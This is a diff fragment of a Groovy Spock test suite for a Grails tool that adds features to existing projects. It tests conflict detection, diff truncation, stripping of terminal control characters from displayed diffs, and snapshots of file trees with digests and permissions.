+        ChangePlan plan = planOf(generator, project)
+
+        then:
+        plan.conflicts*.path == ['build.gradle']
+        plan.conflicts[0].reason == 'the feature changes this file, and the file of the project has more lines than are merged (200000) or differs from the generated one ' +
+                'in more of them (2000)'
+        plan.diff().size() < 100
+
+        when: 'fewer lines, all of them others'
+        project.resolve('build.gradle').toFile().text = (0..<20000).collect { "// line ${it} of the project" }.join('\n') + '\n'
+        plan = planOf(generator, project)
+
+        then:
+        plan.conflicts*.path == ['build.gradle']
+
+        when: 'many lines, and the generated ones among them'
+        project.resolve('build.gradle').toFile().text = (0..<50000).collect { "// line ${it} of the project" }.join('\n') + '\n' + build
+        plan = planOf(generator, project)
+
+        then:
+        plan.files.find { it.path == 'build.gradle' }.action == Action.MERGE
+    }
+
+    void "the difference that is shown is cut, and has nothing a terminal acts on"() {
+        given:
+        ProjectGenerator generator = generator { GeneratorContext context ->
+            if (context.features.contains(FEATURE)) {
+                context.addTemplate('long', new Fixed('long.txt', ((0..<3000).collect { "line ${it}" }.join('\n') + '\n').bytes, false, false))
+                (0..<8).each { int index ->
+                    context.addTemplate("more${index}", new Fixed("more${index}.txt", ((0..<390).collect { "line ${it}" }.join('\n') + '\n').bytes, false, false))
+                }
+            }
+        }
+        Path project = create(generator, 'app', [])
+        Path with = create(beanContext.getBean(ProjectGenerator), 'with', [FEATURE])
+        List<String> generated = project.resolve('build.gradle').toFile().readLines()
+        List<String> withFeature = with.resolve('build.gradle').toFile().readLines()
+        int where = (0..<generated.size()).find { generated[it] != withFeature[it] }
+        // a line of the project two lines above where the feature adds its own, in a file with CR LF
+        project.resolve('build.gradle').toFile().setText((generated.take(where - 2) + ['// right to left: \u202e, an escape: \u001b[31m, a tabulator:\t.'] +
+                generated.drop(where - 2)).join('\r\n') + '\r\n', 'UTF-8')
+
+        when:
+        List<String> diff = planOf(generator, project).diff()
+
+        then: 'no more of one file than 400 lines, and no more than 2000 of all'
+        diff.contains('... 2603 more lines of long.txt are not shown')
+        diff.count { it.startsWith('+line ') } < 2000
+        diff.size() <= ChangePlan.MAX_DIFF + 1
+        diff.last() ==~ /\.\.\. \d+ more lines of other files are not shown/
+
+        and: 'the lines of a file with CR LF are shown without it, and what would turn the terminal is not shown'
+        diff.contains(' // right to left: ?, an escape: ?[31m, a tabulator:\t.')
+        diff.contains('+    implementation "org.apache.grails:grails-quartz"')
+        !diff.any { it.contains('\u202e') || it.contains('\u001b') || it.contains('\r') || it.endsWith('?') }
+    }
+
+    void "lines that both changed are shown with what to do about them"() {
+        given:
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Path with = create(generator, 'with', [FEATURE])
+        List<String> generated = project.resolve('build.gradle').toFile().readLines()
+        List<String> withFeature = with.resolve('build.gradle').toFile().readLines()
+        int where = (0..<generated.size()).find { generated[it] != withFeature[it] }
+        project.resolve('build.gradle').toFile().text = (generated.take(where) + ['    implementation "com.acme:mine:1.0" // \u202e'] + generated.drop(where)).join('\n') + '\n'
+
+        when:
+        ChangePlan plan = planOf(generator, project)
+
+        then:
+        plan.conflicts[0].details == [
+                "at line ${where + 1} the project has:".toString(),
+                '        implementation "com.acme:mine:1.0" // ?',
+                'and the feature has there:',
+                '        implementation "org.apache.grails:grails-quartz"',
+                'Both changed the same place, so neither is taken for the other. Move the lines of the project that are shown to another place of the file, ' +
+                        'at least one unchanged line away (or take them out), add the feature again, and then put them where they belong']
+    }
+
+    static boolean ignoresCase() {
+        Path probe = Files.createTempFile('probe', '.case')
+        boolean ignores = Files.exists(probe.resolveSibling(probe.fileName.toString().toUpperCase(Locale.ROOT)))
+        Files.delete(probe)
+        return ignores
+    }
+
+    private FeatureAddition addition(ProjectGenerator generator) {
+        return new FeatureAddition(generator, records)
+    }
+
+    private ChangePlan planOf(ProjectGenerator generator, Path project, List<String> features = [FEATURE]) {
+        return addition(generator).plan(project, features, OperatingSystem.LINUX, ConsoleOutput.NOOP)
     }
 
     private ProjectGenerator generator(Closure extra = { }) {
@@ -475,6 +992,16 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         }
     }
 
+    // a binary file, and a file that can be executed in a directory there was not
+    private ProjectGenerator withNewFiles() {
+        return generator { GeneratorContext context ->
+            if (context.features.contains(FEATURE)) {
+                context.addTemplate('icon', new Fixed('src/main/resources/icon.bin', ICON, true, false))
+                context.addTemplate('tool', new Fixed('bin/tool.sh', '#!/bin/sh\necho tool\n'.bytes, false, true))
+            }
+        }
+    }
+
     private Path create(ProjectGenerator generator, String into, List<String> features) {
         Path project = Files.createDirectory(directory.resolve(into))
         Project named = NameUtils.parse('com.acme.shop')
@@ -483,18 +1010,79 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
         return project
     }
 
-    // every file of a project but the lock of its changes: the digest of its content, and whether it can be executed
+    private Path copy(Path project, String into) {
+        Path to = directory.resolve(into)
+        Files.walkFileTree(project, new SimpleFileVisitor<Path>() {
+
+            @Override
+            FileVisitResult preVisitDirectory(Path each, BasicFileAttributes attributes) {
+                Files.copy(each, to.resolve(project.relativize(each).toString()), StandardCopyOption.COPY_ATTRIBUTES)
+                return FileVisitResult.CONTINUE
+            }
+
+            @Override
+            FileVisitResult visitFile(Path each, BasicFileAttributes attributes) {
+                Files.copy(each, to.resolve(project.relativize(each).toString()), StandardCopyOption.COPY_ATTRIBUTES)
+                return FileVisitResult.CONTINUE
+            }
+        })
+        return to
+    }
+
+    // what is in the directory of the changes of a project, but for the lock
+    private static List<String> left(Path project) {
+        Path transactions = project.resolve('.grails/transactions')
+        return Files.isDirectory(transactions) ? (transactions.toFile().list() as List<String>).findAll { it != 'lock' }.sort() : []
+    }
+
+    // the journals there are, of every project
+    private List<Path> journals() {
+        if (!Files.isDirectory(records)) {
+            return []
+        }
+        List<Path> journals = []
+        Files.walk(records).withCloseable { stream -> stream.filter { Path path -> Files.isRegularFile(path) }.each { Path path -> journals << path } }
+        return journals
+    }
+
+    private static String sha(Path file) {
+        return sha(Files.readAllBytes(file))
+    }
+
+    private static String sha(byte[] bytes) {
+        return MessageDigest.getInstance('SHA-256').digest(bytes).encodeHex().toString()
+    }
+
+    private static List<String> differing(Map<String, String> one, Map<String, String> other) {
+        return new ArrayList<String>(one.keySet() + other.keySet()).findAll { one.get(it) != other.get(it) }.sort()
+    }
+
+    /**
+     * Everything of a project: every directory with its mode, and every file with the digest of its
+     * content and its mode, a link as a link. The directory of the changes and the lock in it are
+     * left out, because a project has them once a feature was added to it and not before; what else
+     * is in that directory is not.
+     */
     private static Map<String, String> tree(Path project) {
-        Map<String, String> files = new TreeMap<>()
+        Map<String, String> entries = new TreeMap<>()
+        boolean posix = project.fileSystem.supportedFileAttributeViews().contains('posix')
         Files.walk(project).withCloseable { stream ->
-            stream.filter { Path path -> !Files.isDirectory(path, LinkOption.NOFOLLOW_LINKS) }.each { Path path ->
+            stream.each { Path path ->
                 String name = project.relativize(path).join('/')
-                if (name != '.grails/transactions/lock') {
-                    files.put(name, MessageDigest.getInstance('SHA-256').digest(Files.readAllBytes(path)).encodeHex().toString() + (Files.isExecutable(path) ? ' x' : ''))
+                if (name.isEmpty() || name == '.grails/transactions' || name == '.grails/transactions/lock') {
+                    return
+                }
+                String mode = posix ? PosixFilePermissions.toString(Files.getPosixFilePermissions(path, LinkOption.NOFOLLOW_LINKS)) : String.valueOf(Files.isExecutable(path))
+                if (Files.isSymbolicLink(path)) {
+                    entries.put(name, "link to ${Files.readSymbolicLink(path)}".toString())
+                } else if (Files.isDirectory(path, LinkOption.NOFOLLOW_LINKS)) {
+                    entries.put(name, "directory ${mode}".toString())
+                } else {
+                    entries.put(name, "${sha(path)} ${mode}".toString())
                 }
             }
         }
-        return files
+        return entries
     }
 
     static class WithFiles implements ProjectGenerator {
